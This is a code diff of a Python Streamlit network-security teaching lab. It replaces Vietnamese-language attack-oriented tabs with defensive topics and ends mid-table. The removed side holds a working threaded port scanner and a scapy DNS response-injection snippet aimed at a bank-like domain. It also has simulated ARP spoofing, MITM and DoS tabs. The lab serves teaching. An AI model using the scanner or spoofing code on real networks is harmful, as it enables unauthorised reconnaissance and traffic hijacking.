@@ -1,996 +1,1698 @@
+"""
+Network Security Lab
+Comprehensive network security tools and techniques
+"""
+
 import streamlit as st
-import socket
-import threading
-import time
 import pandas as pd
+import numpy as np
 import plotly.express as px
 import plotly.graph_objects as go
 from plotly.subplots import make_subplots
+import socket
 import subprocess
-import re
+import platform
 import json
-import ipaddress
-import struct
-import random
+import time
 import hashlib
-import base64
+import random
 from datetime import datetime, timedelta
-import concurrent.futures
-from typing import Dict, List, Tuple, Optional
-import os
-import sys
+import ipaddress
+from typing import Dict, List, Tuple, Optional, Any
+
+def create_lab_header(title: str, icon: str, gradient: str = "linear-gradient(90deg, #667eea 0%, #764ba2 100%)"):
+    """Create compact lab header"""
+    return f"""
+    <div style="background: {gradient}; 
+                padding: 0.8rem; border-radius: 6px; margin-bottom: 1rem;">
+        <h3 style="color: white; margin: 0; font-size: 1.2rem;">{icon} {title}</h3>
+    </div>
+    """
 
 def run_lab():
-    """Network Security Lab - Học về bảo mật mạng"""
+    """Network Security Lab - Protect and Defend Networks"""
     
-    # Header với animation
+    # Compact Header
     st.markdown("""
-    <style>
-    .network-header {
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        padding: 2rem;
-        border-radius: 10px;
-        margin-bottom: 2rem;
-    }
-    .pulse {
-        animation: pulse 2s infinite;
-    }
-    @keyframes pulse {
-        0% { opacity: 1; }
-        50% { opacity: 0.7; }
-        100% { opacity: 1; }
-    }
-    </style>
+    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+                padding: 1rem; border-radius: 8px; margin-bottom: 1rem; text-align: center;">
+        <h2 style="color: white; margin: 0; font-size: 1.5rem;">
+            🔒 Network Security Lab
+        </h2>
+        <p style="color: white; margin: 0; font-size: 0.9rem; opacity: 0.9;">
+            Advanced Network Security Tools & Techniques
+        </p>
+    </div>
     """, unsafe_allow_html=True)
     
-    col1, col2, col3 = st.columns([1, 2, 1])
-    with col2:
-        st.markdown("""
-        <div class="network-header">
-            <h1 style="color: white; text-align: center; margin: 0;">
-                <span class="pulse">🌐</span> Network Security Lab
-            </h1>
-            <p style="color: white; text-align: center; margin-top: 10px;">
-                Master Network Security Fundamentals & Advanced Techniques
-            </p>
-        </div>
-        """, unsafe_allow_html=True)
-    
-    # Enhanced tabs với nhiều labs hơn
-    tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs([
-        "🔍 Port Scanner", 
-        "📡 Network Discovery",
-        "🕵️ OS Fingerprinting",
-        "📊 Traffic Analysis",
-        "🎭 ARP Spoofing",
-        "🔐 Man-in-the-Middle",
-        "💣 DoS/DDoS Simulation",
-        "🛡️ Security Assessment"
+    # Security topics tabs
+    tabs = st.tabs([
+        "🔥 Firewall",
+        "🛡️ IDS/IPS",
+        "🔐 Access Control",
+        "🌐 NAC",
+        "📡 Wireless Security",
+        "🔍 Port Security",
+        "🎭 ARP Security",
+        "🚫 DDoS Protection",
+        "🔒 VPN Security",
+        "📊 SIEM",
+        "🕵️ Penetration Testing",
+        "🚨 Incident Response"
     ])
-    
-    with tab1:
-        port_scanner_lab()
-    
-    with tab2:
-        network_discovery_lab()
-    
-    with tab3:
-        os_fingerprinting_lab()
-        
-    with tab4:
-        traffic_analysis_lab()
-        
-    with tab5:
-        arp_spoofing_lab()
-        
-    with tab6:
-        mitm_lab()
-        
-    with tab7:
-        dos_ddos_lab()
-        
-    with tab8:
-        security_assessment_lab()
-
-def port_scanner_lab():
-    """Lab quét port"""
-    
-    # Header với gradient
-    st.markdown("""
-    <div style="background: linear-gradient(90deg, #FF6B6B 0%, #4ECDC4 100%); 
-                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
-        <h2 style="color: white; margin: 0;">🔍 Port Scanner Lab</h2>
-        <p style="color: white; margin: 5px 0 0 0;">Explore Network Services & Vulnerabilities</p>
-    </div>
-    """, unsafe_allow_html=True)
-    
-    # Quick Stats Cards
-    col1, col2, col3, col4 = st.columns(4)
-    with col1:
-        st.metric("🌐 Total Ports", "65,535", "TCP/UDP")
-    with col2:
-        st.metric("🔒 System Ports", "0-1023", "Privileged")
-    with col3:
-        st.metric("📊 User Ports", "1024-49151", "Registered")
-    with col4:
-        st.metric("🎲 Dynamic Ports", "49152-65535", "Private")
-    
-    # Thêm phần giải thích chi tiết với visual enhancements
-    with st.expander("📖 Lý thuyết chi tiết về Port Scanning", expanded=False):
-        st.markdown("""
-        ### 🎯 Port Scanning là gì?
-        
-        **Port Scanner** là công cụ để kiểm tra các port đang mở trên một máy tính hoặc server.
-        Đây là bước đầu tiên trong quá trình **reconnaissance** của penetration testing.
-        
-        ### 🔌 Hiểu về Ports
-        
-        **Port** là endpoint của communication trong networking:
-        - **Range**: 0-65535 (16-bit number)
-        - **Well-known ports**: 0-1023 (system ports)
-        - **Registered ports**: 1024-49151 (user ports)
-        - **Dynamic ports**: 49152-65535 (private ports)
-        
-        **Common Ports:**
-        - **22**: SSH (Secure Shell)
-        - **23**: Telnet (Insecure remote access)
-        - **25**: SMTP (Email sending)
-        - **53**: DNS (Domain Name System)
-        - **80**: HTTP (Web traffic)
-        - **443**: HTTPS (Secure web traffic)
-        - **3389**: RDP (Remote Desktop Protocol)
-        
-        ### 🔍 Các loại Port Scan
-        
-        **1. TCP Connect Scan**
-        - Thực hiện full TCP handshake (SYN → SYN-ACK → ACK)
-        - **Ưu điểm**: Reliable, works through firewalls
-        - **Nhược điểm**: Easily detected, logged by target
-        - **Khi nào dùng**: When stealth is not required
-        
-        **2. SYN Scan (Half-open scan)**
-        - Chỉ gửi SYN packet, không hoàn thành handshake
-        - **Ưu điểm**: Stealthier, faster
-        - **Nhược điểm**: Requires raw socket access
-        - **Khi nào dùng**: Stealth reconnaissance
-        
-        **3. UDP Scan**
-        - Quét các port UDP (connectionless protocol)
-        - **Ưu điểm**: Finds UDP services
-        - **Nhược điểm**: Slower, less reliable
-        - **Khi nào dùng**: Looking for DNS, DHCP, SNMP services
-        
-        **4. FIN Scan**
-        - Gửi FIN packet thay vì SYN
-        - **Ưu điểm**: Bypasses some firewalls
-        - **Nhược điểm**: Not reliable on all systems
-        
-        **5. NULL Scan**
-        - Gửi packet không có flags
-        - **Ưu điểm**: Very stealthy
-        - **Nhược điểm**: OS-dependent results
-        
-        ### 🛡️ Port States
-        
-        **Open**: Port is accepting connections
-        - Service is listening on this port
-        - Potential entry point for attackers
-        
-        **Closed**: Port is not accepting connections
-        - No service running on this port
-        - System is reachable but port is unused
-        
-        **Filtered**: Cannot determine if port is open
-        - Firewall or packet filter is blocking
-        - No response received
-        
-        **Unfiltered**: Port is accessible but state unknown
-        - Rare state, usually in ACK scans
-        
-        ### ⚖️ Legal và Ethical Considerations
-        
-        **✅ Legal Port Scanning:**
-        - Your own systems
-        - Systems you have written permission to test
-        - Bug bounty programs with explicit scope
-        
-        **❌ Illegal Port Scanning:**
-        - Systems you don't own or have permission
-        - Scanning without authorization
-        - Using results for malicious purposes
-        
-        **🔒 Detection và Prevention:**
-        - **IDS/IPS**: Intrusion Detection/Prevention Systems
-        - **Rate limiting**: Slow down scan attempts
-        - **Port knocking**: Hide services behind sequences
-        - **Fail2ban**: Automatic IP blocking
-        """)
-    
-    st.markdown("""
-    ### 🚀 Thực hành Port Scanning
-    
-    Sử dụng tool bên dưới để thực hành các kỹ thuật port scanning khác nhau:
-    """)
-    
-    col1, col2 = st.columns([1, 1])
-    
-    with col1:
-        st.markdown("#### ⚙️ Cấu hình Scan")
-        target_host = st.text_input("Target Host:", value="127.0.0.1", help="IP address hoặc hostname")
-        
-        scan_type = st.selectbox("Loại scan:", [
-            "Quick Scan (Common Ports)",
-            "Full Scan (1-65535)", 
-            "Custom Range"
-        ])
-        
-        if scan_type == "Custom Range":
-            port_range = st.text_input("Port Range:", value="1-1000", help="Ví dụ: 1-1000 hoặc 80,443,22")
-        
-        timeout = st.slider("Timeout (seconds):", 1, 10, 3)
-        
-        if st.button("🚀 Bắt đầu Scan", type="primary"):
-            if scan_type == "Quick Scan (Common Ports)":
-                ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306]
-            elif scan_type == "Full Scan (1-65535)":
-                ports = range(1, 65536)
-            else:
-                ports = parse_port_range(port_range)
-            
-            with st.spinner("Đang quét ports..."):
-                results = scan_ports(target_host, ports, timeout)
-                st.session_state['scan_results'] = results
-    
-    with col2:
-        st.markdown("#### 📊 Kết quả Scan")
-        
-        if 'scan_results' in st.session_state:
-            results = st.session_state['scan_results']
-            
-            if results['open_ports']:
-                st.success(f"Tìm thấy {len(results['open_ports'])} port đang mở!")
-                
-                # Tạo DataFrame cho hiển thị
-                df = pd.DataFrame([
-                    {"Port": port, "Service": get_service_name(port), "Status": "Open"}
-                    for port in results['open_ports']
-                ])
-                
-                st.dataframe(df, width='stretch')
-                
-                # Biểu đồ
-                fig = px.bar(df, x='Port', y=[1]*len(df), 
-                           title="Open Ports Distribution",
-                           labels={'y': 'Count'})
-                st.plotly_chart(fig, width='stretch')
-                
-            else:
-                st.warning("Không tìm thấy port nào đang mở.")
-            
-            # Thống kê
-            st.info(f"""
-            **Thống kê scan:**
-            - Tổng ports đã quét: {results['total_scanned']}
-            - Ports mở: {len(results['open_ports'])}
-            - Thời gian scan: {results['scan_time']:.2f}s
-            """)
-
-def network_discovery_lab():
-    """Lab khám phá mạng"""
-    st.subheader("📡 Network Discovery Lab")
-    
-    st.markdown("""
-    ### 📖 Lý thuyết:
-    Network Discovery giúp tìm ra các thiết bị đang hoạt động trong mạng.
-    Đây là bước quan trọng để hiểu topology mạng và xác định target.
-    """)
-    
-    col1, col2 = st.columns([1, 1])
-    
-    with col1:
-        st.markdown("#### 🔍 Ping Sweep")
-        network = st.text_input("Network Range:", value="192.168.1.0/24", 
-                               help="Ví dụ: 192.168.1.0/24")
-        
-        if st.button("🔍 Discover Hosts"):
-            with st.spinner("Đang quét mạng..."):
-                hosts = ping_sweep(network)
-                st.session_state['discovered_hosts'] = hosts
-    
-    with col2:
-        st.markdown("#### 📋 Kết quả Discovery")
-        
-        if 'discovered_hosts' in st.session_state:
-            hosts = st.session_state['discovered_hosts']
-            
-            if hosts:
-                st.success(f"Tìm thấy {len(hosts)} host đang hoạt động!")
-                
-                for host in hosts:
-                    st.write(f"✅ {host}")
-            else:
-                st.warning("Không tìm thấy host nào.")
-
-def traffic_analysis_lab():
-    """Lab phân tích traffic mạng"""
-    st.subheader("📊 Traffic Analysis Lab")
-    
-    st.markdown("""
-    ### 📖 Lý thuyết:
-    Traffic Analysis giúp hiểu về luồng dữ liệu trong mạng,
-    phát hiện các hoạt động bất thường và potential threats.
-    """)
-    
-    # Mô phỏng traffic data
-    if st.button("📊 Generate Sample Traffic Data"):
-        traffic_data = generate_sample_traffic()
-        
-        # Hiển thị bảng traffic
-        st.dataframe(traffic_data, width='stretch')
-        
-        # Biểu đồ phân tích
-        col1, col2 = st.columns(2)
-        
-        with col1:
-            # Protocol distribution
-            protocol_counts = traffic_data['Protocol'].value_counts()
-            fig1 = px.pie(values=protocol_counts.values, names=protocol_counts.index,
-                         title="Protocol Distribution")
-            st.plotly_chart(fig1, width='stretch')
-        
-        with col2:
-            # Traffic over time
-            fig2 = px.line(traffic_data, x='Timestamp', y='Bytes',
-                          title="Traffic Over Time")
-            st.plotly_chart(fig2, width='stretch')
-
-def security_assessment_lab():
-    """Lab đánh giá bảo mật"""
-    st.subheader("🛡️ Security Assessment Lab")
-    
-    st.markdown("""
-    ### 📖 Lý thuyết:
-    Security Assessment bao gồm việc đánh giá các lỗ hổng bảo mật
-    và đưa ra khuyến nghị để cải thiện tình hình bảo mật.
-    """)
-    
-    assessment_type = st.selectbox("Loại đánh giá:", [
-        "Basic Port Security Check",
-        "Service Version Detection", 
-        "Common Vulnerabilities Check"
-    ])
-    
-    target = st.text_input("Target:", value="127.0.0.1")
-    
-    if st.button("🔍 Bắt đầu Assessment"):
-        with st.spinner("Đang thực hiện security assessment..."):
-            if assessment_type == "Basic Port Security Check":
-                results = basic_security_check(target)
-            elif assessment_type == "Service Version Detection":
-                results = service_detection(target)
-            else:
-                results = vulnerability_check(target)
-            
-            display_assessment_results(results)
-
-# Helper functions
-def scan_ports(host, ports, timeout):
-    """Quét ports trên host"""
-    open_ports = []
-    start_time = time.time()
-    
-    def scan_port(port):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(timeout)
-            result = sock.connect_ex((host, port))
-            if result == 0:
-                open_ports.append(port)
-            sock.close()
-        except:
-            pass
-    
-    # Sử dụng threading để scan nhanh hơn
-    threads = []
-    for port in ports:
-        thread = threading.Thread(target=scan_port, args=(port,))
-        threads.append(thread)
-        thread.start()
-        
-        # Giới hạn số thread đồng thời
-        if len(threads) >= 50:
-            for t in threads:
-                t.join()
-            threads = []
-    
-    # Đợi các thread còn lại
-    for thread in threads:
-        thread.join()
-    
-    end_time = time.time()
-    
-    return {
-        'open_ports': sorted(open_ports),
-        'total_scanned': len(ports),
-        'scan_time': end_time - start_time
-    }
-
-def parse_port_range(port_range):
-    """Parse port range string thành list ports"""
-    ports = []
-    
-    if '-' in port_range:
-        start, end = map(int, port_range.split('-'))
-        ports = list(range(start, end + 1))
-    elif ',' in port_range:
-        ports = [int(p.strip()) for p in port_range.split(',')]
-    else:
-        ports = [int(port_range)]
-    
-    return ports
-
-def get_service_name(port):
-    """Lấy tên service từ port number"""
-    services = {
-        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
-        53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
-        443: "HTTPS", 993: "IMAPS", 995: "POP3S",
-        3389: "RDP", 5432: "PostgreSQL", 3306: "MySQL"
-    }
-    return services.get(port, "Unknown")
-
-def ping_sweep(network):
-    """Thực hiện ping sweep trên network"""
-    # Mô phỏng ping sweep (trong thực tế sẽ dùng subprocess để ping)
-    import random
-    
-    # Giả lập một số host đang hoạt động
-    base_ip = network.split('/')[0].rsplit('.', 1)[0]
-    active_hosts = []
-    
-    for i in range(1, 10):  # Mô phỏng scan 10 IP đầu
-        if random.random() > 0.7:  # 30% chance host đang hoạt động
-            active_hosts.append(f"{base_ip}.{i}")
-    
-    return active_hosts
-
-def generate_sample_traffic():
-    """Tạo dữ liệu traffic mẫu"""
-    import random
-    from datetime import datetime, timedelta
-    
-    protocols = ['TCP', 'UDP', 'ICMP']
-    data = []
-    
-    base_time = datetime.now() - timedelta(hours=1)
-    
-    for i in range(100):
-        data.append({
-            'Timestamp': base_time + timedelta(seconds=i*36),
-            'Source IP': f"192.168.1.{random.randint(1, 254)}",
-            'Dest IP': f"10.0.0.{random.randint(1, 254)}",
-            'Protocol': random.choice(protocols),
-            'Bytes': random.randint(64, 1500),
-            'Port': random.choice([80, 443, 22, 21, 25])
-        })
-    
-    return pd.DataFrame(data)
-
-def basic_security_check(target):
-    """Kiểm tra bảo mật cơ bản"""
-    # Mô phỏng kết quả security check
-    return {
-        'status': 'completed',
-        'findings': [
-            {'severity': 'High', 'issue': 'SSH service running on default port 22'},
-            {'severity': 'Medium', 'issue': 'HTTP service detected (unencrypted)'},
-            {'severity': 'Low', 'issue': 'Banner grabbing possible'}
-        ],
-        'recommendations': [
-            'Change SSH to non-standard port',
-            'Implement HTTPS',
-            'Disable service banners'
-        ]
-    }
-
-def service_detection(target):
-    """Phát hiện version của services"""
-    return {
-        'services': [
-            {'port': 22, 'service': 'SSH', 'version': 'OpenSSH 8.2'},
-            {'port': 80, 'service': 'HTTP', 'version': 'Apache 2.4.41'},
-            {'port': 443, 'service': 'HTTPS', 'version': 'Apache 2.4.41'}
-        ]
-    }
-
-def vulnerability_check(target):
-    """Kiểm tra lỗ hổng phổ biến"""
-    return {
-        'vulnerabilities': [
-            {'cve': 'CVE-2021-44228', 'severity': 'Critical', 'description': 'Log4j RCE'},
-            {'cve': 'CVE-2021-34527', 'severity': 'High', 'description': 'PrintNightmare'}
-        ]
-    }
-
-def display_assessment_results(results):
-    """Hiển thị kết quả assessment"""
-    if 'findings' in results:
-        st.markdown("#### 🔍 Security Findings")
-        for finding in results['findings']:
-            if finding['severity'] == 'High':
-                st.error(f"🔴 **{finding['severity']}**: {finding['issue']}")
-            elif finding['severity'] == 'Medium':
-                st.warning(f"🟡 **{finding['severity']}**: {finding['issue']}")
-            else:
-                st.info(f"🔵 **{finding['severity']}**: {finding['issue']}")
-    
-    if 'services' in results:
-        st.markdown("#### 🔧 Detected Services")
-        df = pd.DataFrame(results['services'])
-        st.dataframe(df, width='stretch')
-    
-    if 'vulnerabilities' in results:
-        st.markdown("#### ⚠️ Vulnerabilities")
-        for vuln in results['vulnerabilities']:
-            st.error(f"**{vuln['cve']}** ({vuln['severity']}): {vuln['description']}")
-
-# New lab functions for enhanced security testing
-def os_fingerprinting_lab():
-    """Lab OS Fingerprinting - Xác định hệ điều hành"""
-    
-    st.markdown("""
-    <div style="background: linear-gradient(90deg, #667eea 0%, #764ba2 100%); 
-                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
-        <h2 style="color: white; margin: 0;">🕵️ OS Fingerprinting Lab</h2>
-        <p style="color: white; margin: 5px 0 0 0;">Identify Operating Systems Through Network Analysis</p>
-    </div>
-    """, unsafe_allow_html=True)
-    
-    # Theory Section with Visual Cards
-    with st.expander("📚 **Advanced OS Fingerprinting Theory**", expanded=False):
-        col1, col2 = st.columns(2)
-        
-        with col1:
-            st.markdown("""
-            ### 🎯 **Active Fingerprinting**
-            
-            #### **TCP/IP Stack Analysis**
-            ```
-            ┌─────────────────┐
-            │   Application   │
-            ├─────────────────┤
-            │   Transport     │ ← TCP Options
-            ├─────────────────┤
-            │    Network      │ ← TTL Values
-            ├─────────────────┤
-            │   Data Link     │ ← Frame Size
-            └─────────────────┘
-            ```
-            
-            **🔍 Key Indicators:**
-            - **TTL (Time To Live):** 
-                - Windows: 128
-                - Linux: 64
-                - Cisco: 255
-            - **TCP Window Size:** OS-specific defaults
-            - **TCP Options Order:** Unique patterns
-            - **DF Flag:** Don't Fragment behavior
-            """)
-        
-        with col2:
-            st.markdown("""
-            ### 🌐 **Passive Fingerprinting**
-            
-            #### **P0f Technique**
-            ```python
-            # TCP SYN packet analysis
-            packet = {
-                'window_size': 65535,
-                'ttl': 128,
-                'df': True,
-                'options': ['MSS', 'NOP', 'WS', 'SACK']
-            }
-            # → Likely Windows 10
-            ```
-            
-            **📊 Fingerprinting Methods:**
-            - **Banner Grabbing:** Service responses
-            - **ICMP Analysis:** Error message formats
-            - **HTTP Headers:** Server information
-            - **SSL/TLS:** Cipher suite preferences
-            """)
-    
-    # Practical Lab Section
-    st.markdown("### 🔬 **Practical OS Detection**")
-    
-    col1, col2 = st.columns([1, 1])
-    
-    with col1:
-        st.markdown("#### ⚙️ **Configuration**")
-        
-        target_ip = st.text_input("🎯 Target IP:", value="192.168.1.1")
-        
-        technique = st.selectbox("🛠️ Detection Technique:", [
-            "TCP/IP Stack Fingerprinting",
-            "Banner Grabbing",
-            "Nmap OS Detection",
-            "P0f Passive Analysis",
-            "ICMP Fingerprinting",
-            "Combined Analysis"
-        ])
-        
-        aggressive_mode = st.checkbox("⚡ Aggressive Mode", help="Faster but more detectable")
-        
-        if st.button("🚀 **Start OS Detection**", type="primary"):
-            with st.spinner("Analyzing target system..."):
-                results = perform_os_fingerprinting(target_ip, technique, aggressive_mode)
-                st.session_state['os_results'] = results
-    
-    with col2:
-        st.markdown("#### 📊 **Detection Results**")
-        
-        if 'os_results' in st.session_state:
-            results = st.session_state['os_results']
-            
-            # OS Detection Confidence
-            confidence = results.get('confidence', 0)
-            st.progress(confidence / 100)
-            st.metric("🎯 Detection Confidence", f"{confidence}%")
-            
-            # Detected OS
-            st.success(f"**🖥️ Detected OS:** {results['os']}")
-            st.info(f"**📌 Version:** {results.get('version', 'Unknown')}")
-            
-            # Technical Details
-            with st.expander("🔍 **Technical Analysis**"):
-                st.json(results.get('technical_details', {}))
-            
-            # Visualization
-            if 'fingerprint_data' in results:
-                fig = create_fingerprint_visualization(results['fingerprint_data'])
-                st.plotly_chart(fig, use_container_width=True)
-
-def arp_spoofing_lab():
-    """Lab ARP Spoofing - Tấn công ARP"""
-    
-    st.markdown("""
-    <div style="background: linear-gradient(90deg, #f093fb 0%, #f5576c 100%); 
-                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
-        <h2 style="color: white; margin: 0;">🎭 ARP Spoofing Lab</h2>
-        <p style="color: white; margin: 5px 0 0 0;">Understanding ARP Cache Poisoning Attacks</p>
-    </div>
-    """, unsafe_allow_html=True)
-    
-    # Warning Box
-    st.warning("""
-    ⚠️ **Legal Warning:** This lab is for educational purposes only. 
-    ARP spoofing on networks you don't own is illegal and unethical.
-    """)
-    
-    # Theory with Diagrams
-    with st.expander("📚 **ARP Spoofing Theory & Techniques**", expanded=False):
-        st.markdown("""
-        ### 🔄 **How ARP Works**
-        
-        ```
-        Normal ARP Process:
-        ┌──────────┐  Who has 192.168.1.1?  ┌──────────┐
-        │ Host A   │ ─────────────────────> │ Broadcast│
-        │192.168.1.2│                        │   FF:FF  │
-        └──────────┘                        └──────────┘
-                ↑                                 ↓
-                │   I am 192.168.1.1             │
-                │   MAC: AA:BB:CC:DD:EE:FF       │
-                └─────────────────────────────────┘
-        
-        ARP Spoofing Attack:
-        ┌──────────┐                        ┌──────────┐
-        │ Victim   │ <──── Fake ARP ────── │ Attacker │
-        │192.168.1.2│   "I am Gateway"      │192.168.1.5│
-        └──────────┘                        └──────────┘
-                ↓                                 ↑
-                └──────── All Traffic ────────────┘
-        ```
-        
-        ### 🎯 **Attack Vectors**
-        
-        | Attack Type | Description | Impact |
-        |------------|-------------|---------|
-        | **MITM** | Intercept all traffic | High |
-        | **DoS** | Disrupt network connectivity | Medium |
-        | **Session Hijacking** | Steal active sessions | Critical |
-        | **DNS Spoofing** | Redirect to malicious sites | High |
-        """)
-    
-    # Lab Interface
-    col1, col2 = st.columns([1, 1])
-    
-    with col1:
-        st.markdown("#### 🎯 **Attack Configuration**")
-        
-        victim_ip = st.text_input("👤 Victim IP:", value="192.168.1.100")
-        gateway_ip = st.text_input("🌐 Gateway IP:", value="192.168.1.1")
-        
-        attack_mode = st.radio("⚔️ Attack Mode:", [
-            "🔍 Passive Monitoring",
-            "🎭 Active MITM",
-            "💣 DoS Attack",
-            "📡 Traffic Redirection"
-        ])
-        
-        packet_forward = st.checkbox("📨 Enable Packet Forwarding", value=True)
-        
-        if st.button("🚀 **Launch ARP Attack**", type="primary"):
-            st.error("⛔ This is a simulation only - no actual attack performed")
-            results = simulate_arp_attack(victim_ip, gateway_ip, attack_mode)
-            st.session_state['arp_results'] = results
-    
-    with col2:
-        st.markdown("#### 📊 **Attack Results**")
-        
-        if 'arp_results' in st.session_state:
-            results = st.session_state['arp_results']
-            
-            # Attack Status
-            st.success("✅ **Attack Simulation Complete**")
-            
-            # Statistics
-            col_a, col_b = st.columns(2)
-            with col_a:
-                st.metric("📦 Packets Sent", results['packets_sent'])
-            with col_b:
-                st.metric("🎯 Success Rate", f"{results['success_rate']}%")
-            
-            # Captured Traffic Preview
-            st.markdown("**📡 Simulated Captured Traffic:**")
-            traffic_df = pd.DataFrame(results['captured_traffic'])
-            st.dataframe(traffic_df, use_container_width=True)
-            
-            # Mitigation Strategies
-            with st.expander("🛡️ **Defense Mechanisms**"):
-                st.markdown("""
-                **Prevention Methods:**
-                - 🔒 Static ARP entries
-                - 🛡️ ARP inspection (DAI)
-                - 📊 Network monitoring
-                - 🔐 Port security
-                - 🌐 VLANs segmentation
-                """)
-
-def mitm_lab():
-    """Lab Man-in-the-Middle Attack"""
-    
-    st.markdown("""
-    <div style="background: linear-gradient(90deg, #FA8BFF 0%, #2BD2FF 50%, #2BFF88 100%); 
-                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
-        <h2 style="color: white; margin: 0;">🔓 Man-in-the-Middle Lab</h2>
-        <p style="color: white; margin: 5px 0 0 0;">Intercepting and Analyzing Network Communications</p>
-    </div>
-    """, unsafe_allow_html=True)
-    
-    # Interactive MITM Diagram
-    st.markdown("""
-    ### 🎯 **MITM Attack Flow**
-    
-    ```mermaid
-    graph LR
-        A[👤 Victim] -->|Encrypted Traffic| B[🦹 Attacker]
-        B -->|Decrypted/Modified| C[🌐 Server]
-        C -->|Response| B
-        B -->|Modified Response| A
-        
-        style B fill:#ff6b6b,stroke:#fff,stroke-width:2px
-    ```
-    """)
-    
-    tabs = st.tabs(["🔐 SSL/TLS MITM", "🌐 DNS Hijacking", "📡 WiFi MITM", "🍪 Session Hijacking"])
     
     with tabs[0]:
-        st.markdown("#### 🔐 **SSL/TLS Interception**")
-        
-        col1, col2 = st.columns(2)
-        with col1:
-            target_site = st.text_input("🎯 Target Website:", value="https://example.com")
-            cert_method = st.selectbox("📜 Certificate Method:", [
-                "Self-Signed Certificate",
-                "Cloned Certificate",
-                "Subdomain Takeover",
-                "BGP Hijacking"
-            ])
-            
-            if st.button("🚀 Start SSL MITM"):
-                results = simulate_ssl_mitm(target_site, cert_method)
-                st.json(results)
-        
-        with col2:
-            st.info("""
-            **🛡️ SSL Pinning Bypass:**
-            - Frida Framework
-            - Objection Toolkit
-            - Certificate Transparency
-            - HPKP Headers
-            """)
+        firewall_lab()
     
     with tabs[1]:
-        st.markdown("#### 🌐 **DNS Hijacking Attack**")
-        
-        dns_target = st.text_input("🎯 Target Domain:", value="bank.example.com")
-        redirect_ip = st.text_input("➡️ Redirect to IP:", value="192.168.1.100")
-        
-        if st.button("🎭 Hijack DNS"):
-            st.code(f"""
-            # DNS Response Injection
-            if packet.haslayer(DNS) and packet[DNS].qr == 0:
-                if "{dns_target}" in packet[DNS].qd.qname:
-                    spoofed = IP(dst=packet[IP].src)/\\
-                              UDP(dport=packet[UDP].sport)/\\
-                              DNS(id=packet[DNS].id, qr=1, 
-                                  an=DNSRR(name=packet[DNS].qd.qname,
-                                          rdata='{redirect_ip}'))
-                    send(spoofed)
-            """, language="python")
+        ids_ips_lab()
+    
+    with tabs[2]:
+        access_control_lab()
+    
+    with tabs[3]:
+        nac_lab()
+    
+    with tabs[4]:
+        wireless_security_lab()
+    
+    with tabs[5]:
+        port_security_lab()
+    
+    with tabs[6]:
+        arp_security_lab()
+    
+    with tabs[7]:
+        ddos_protection_lab()
+    
+    with tabs[8]:
+        vpn_security_lab()
+    
+    with tabs[9]:
+        siem_lab()
+    
+    with tabs[10]:
+        penetration_testing_lab()
+    
+    with tabs[11]:
+        incident_response_lab()
 
-def dos_ddos_lab():
-    """Lab DoS/DDoS Simulation"""
+def firewall_lab():
+    """Firewall Configuration and Management"""
     
-    st.markdown("""
-    <div style="background: linear-gradient(90deg, #ff6a00 0%, #ee0979 100%); 
-                padding: 20px; border-radius: 10px; margin-bottom: 20px;">
-        <h2 style="color: white; margin: 0;">💣 DoS/DDoS Simulation Lab</h2>
-        <p style="color: white; margin: 5px 0 0 0;">Understanding Denial of Service Attack Patterns</p>
-    </div>
-    """, unsafe_allow_html=True)
+    st.markdown(create_lab_header("Firewall Lab", "🔥", "linear-gradient(90deg, #FF6B6B 0%, #4ECDC4 100%)"), unsafe_allow_html=True)
     
-    # Attack Types Grid
-    st.markdown("### 🎯 **Attack Vector Selection**")
-    
-    attack_types = {
-        "🌊 SYN Flood": "TCP SYN packets overwhelming the target",
-        "📦 UDP Flood": "High volume UDP packet bombardment",
-        "🌐 HTTP Flood": "Application layer resource exhaustion",
-        "💥 Smurf Attack": "ICMP amplification attack",
-        "🔄 Slowloris": "Keeping connections open indefinitely",
-        "⚡ Ping of Death": "Oversized ICMP packets"
-    }
-    
-    cols = st.columns(3)
-    for idx, (attack, desc) in enumerate(attack_types.items()):
-        with cols[idx % 3]:
-            if st.button(attack, use_container_width=True):
-                st.info(f"**{attack}:** {desc}")
-                simulate_dos_attack(attack)
-    
-    # Real-time Attack Metrics
-    st.markdown("### 📊 **Attack Metrics Dashboard**")
-    
-    col1, col2, col3, col4 = st.columns(4)
-    with col1:
-        st.metric("📦 Packets/sec", "10,000", "↑ 500%")
-    with col2:
-        st.metric("🔥 Bandwidth", "1.2 Gbps", "↑ 1200%")
-    with col3:
-        st.metric("🎯 Success Rate", "87%", "↓ 13%")
-    with col4:
-        st.metric("⏱️ Response Time", "5000ms", "↑ 4500ms")
-    
-    # Mitigation Strategies
-    with st.expander("🛡️ **DDoS Mitigation Strategies**"):
+    # Theory Section
+    with st.expander("📖 **Firewall Theory**", expanded=True):
         st.markdown("""
-        ### **Prevention & Mitigation**
+        ### 🔥 **Understanding Firewalls**
         
-        | Strategy | Description | Effectiveness |
-        |----------|-------------|---------------|
-        | **Rate Limiting** | Limit requests per IP | 🟡 Medium |
-        | **CDN/Proxy** | Distribute traffic load | 🟢 High |
-        | **Blackholing** | Drop malicious traffic | 🟢 High |
-        | **SYN Cookies** | Prevent SYN flood | 🟢 High |
-        | **Anycast** | Geographic distribution | 🟢 High |
-        | **Machine Learning** | Anomaly detection | 🟡 Medium |
+        Firewalls are the first line of defense in network security, controlling traffic flow between 
+        network segments based on predetermined security rules.
+        
+        **Firewall Evolution:**
+        - **Gen 1: Packet Filters** - Port/IP based (1988)
+        - **Gen 2: Stateful** - Connection tracking (1990s)
+        - **Gen 3: Application** - Layer 7 inspection (2000s)
+        - **Gen 4: NGFW** - IPS + App control (2010s)
+        - **Gen 5: AI-Powered** - ML threat detection (2020s)
+        
+        **Firewall Types Comparison:**
+        
+        | Type | OSI Layer | Pros | Cons | Use Case |
+        |------|-----------|------|------|----------|
+        | Packet Filter | 3-4 | Fast, simple | No state tracking | Basic filtering |
+        | Stateful | 3-4 | Connection aware | Limited app visibility | General purpose |
+        | Application | 3-7 | Deep inspection | Performance impact | Web applications |
